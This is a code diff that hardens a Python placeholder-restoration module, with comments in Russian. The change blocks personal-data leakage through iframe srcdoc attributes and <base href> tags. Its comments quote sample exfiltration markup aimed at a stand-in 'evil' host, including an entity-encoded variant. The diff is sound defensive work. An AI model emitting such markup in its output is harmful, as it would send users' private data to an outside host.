@@ -100,7 +100,7 @@ _LINK = re.compile(
     r"\]\((?P<md>(?:[^()\r\n]|\([^()\r\n]*\))*)\)"
     r"|(?m:^)[ ]{0,3}\[[^\]\r\n]+\]:[ \t]*(?:\r?\n[ \t]*)?"
     r"(?:<(?P<ref>[^\r\n]*)>|(?P<dest>[^\x00-\x20<][^\x00-\x20]*))"
-    r"|(?<![\w-])(?P<name>href|src|srcset|action|formaction|poster|data|background|cite|ping|style|content)"
+    r"|(?<![\w-])(?P<name>href|src|srcset|action|formaction|poster|data|background|cite|ping|style|content|srcdoc)"
     r"\s*=\s*(?:(?P<quote>[\"'])(?P<attr>[\s\S]*?)(?P=quote)|(?P<unquoted>[^\t\n\f\r \"'][^\t\n\f\r ]*))"
     rf"|(?<![\w-]){_URL}\(\s*(?P<cq>[\"'])(?P<css>(?:\\[\s\S]|[^\\])*?)(?:(?P=cq)|\Z)"
     rf"|{_IMPORT}(?P<imp>(?>\s|/\*[\s\S]*?(?:\*/|\Z))*+(?:\"(?:\\[\s\S]|[^\\\"])*+|'(?:\\[\s\S]|[^\\'])*+)?)"
@@ -276,6 +276,7 @@ class _Restorer:
             ("restored", "altered", "derived", "unknown", "kept", "foreign_links"), 0
         )
         self.tags: tuple[str, list[tuple[int, int]], list[int]] | None = None    # ответ и участки вне тегов
+        self.base = False           # в ответе есть <base>: адреса без узла разрешаются против его узла
 
     def run(self, pieces: list[Piece], links: bool) -> list[Piece]:
         if links:
@@ -320,7 +321,10 @@ class _Restorer:
         if target.lower().startswith("mailto:"):
             address = target[len("mailto:"):]
             return address in self.state.surrogates          # без параметров: в них может быть что угодно
-        return all(self._host_is_ours(m.group(1)) for m in _URL_HOSTS.finditer(target) if m.group(1) is not None)
+        hosts = [m.group(1) for m in _URL_HOSTS.finditer(target) if m.group(1) is not None]
+        if not hosts and self.base:
+            return False        # с <base href> адрес без узла уходит на узел из base — его не проверить
+        return all(self._host_is_ours(host) for host in hosts)
 
     def _outside_tags(self, text: str, position: int) -> bool:
         if self.tags is None or self.tags[0] is not text:
@@ -357,6 +361,10 @@ class _Restorer:
         # записанной ссылкой на знак: в атрибуте style «&bsol;2f» — это «\2f».
         css = any(m.group(name) is not None for name in ("css", "imp", "cssu", "set"))
         css = css or (m.group("name") or "").lower() == "style"
+        if (m.group("name") or "").lower() == "srcdoc":
+            # Вложенный документ iframe: браузер раскрывает ссылки на знаки дважды (атрибут, затем сама страница),
+            # и «&amp;#47;&amp;#47;evil» внутри — это «//evil». Нашим он не бывает.
+            return self._inner(m.group()) != m.group()
         if self._is_own(target) and not (css and any("\\" in reading for reading in _readings(m.group()))):
             return False        # ссылка на наш же узел восстанавливается как обычный текст
         restored = self._inner(m.group())
@@ -453,9 +461,15 @@ class _Restorer:
         return self._original(m.group(), surrogate), "altered"
 
 
+# Тег <base> меняет узел всех адресов без узла на странице: «<base href=//evil…><img src=p?q=<EMAIL_1>>»
+# грузит с evil. Какой у него адрес, не важно: базу можно задать и ссылками на знаки, и после других тегов.
+_BASE = re.compile(r"<\s*base[\s/>]", re.IGNORECASE)
+
+
 def restore(state: ChatState, answer: str, settings: Settings) -> RestoreResult:
     """Подставляет оригиналы вместо замен чата. Замены сопоставляются только точно."""
     restorer = _Restorer(state, settings)
+    restorer.base = _BASE.search(answer) is not None
     parts: list[str] = []
     segments: list[Segment] = []
     position = 0
@@ -476,7 +490,7 @@ _HOLD = 512
 # url()/image-set()/src() и @import в CSS. Пока ссылка не закрыта, нельзя решить, наша ли она (FR-7.8), —
 # показ останавливается перед ней, а не восстанавливает метку внутри будущей посторонней ссылки.
 _LINK_OPENER = re.compile(
-    r"(?<![\w-])(?:href|src|srcset|action|formaction|poster|data|background|cite|ping|style|content)"
+    r"(?<![\w-])(?:href|src|srcset|action|formaction|poster|data|background|cite|ping|style|content|srcdoc)"
     r"\s*=\s*(?P<quote>[\"'])"
     r"|\]\("
     r"|(?m:^)[ ]{0,3}\[[^\]\r\n]+\]:[ \t]*(?:\r?\n[ \t]*)?<"
